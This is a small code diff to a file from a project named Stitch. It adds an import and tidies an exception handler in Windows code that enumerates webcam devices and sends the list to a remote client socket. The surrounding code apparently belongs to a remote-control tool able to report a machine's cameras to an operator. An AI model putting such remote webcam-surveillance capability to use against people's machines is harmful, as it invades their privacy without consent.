@@ -1,3 +1,4 @@
+import os
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
@@ -8,7 +9,7 @@ if win_client():
         try:
             dev = vidcap.new_Dev(i, 0)
             names += '   {}. {}\n'.format(i,dev.getdisplayname())
-        except Exception as e:
+        except Exception:
             if i == 0:
                 send(client_socket,"=== Webcam List ===")
                 send(client_socket,"   No video devices detected.\n")
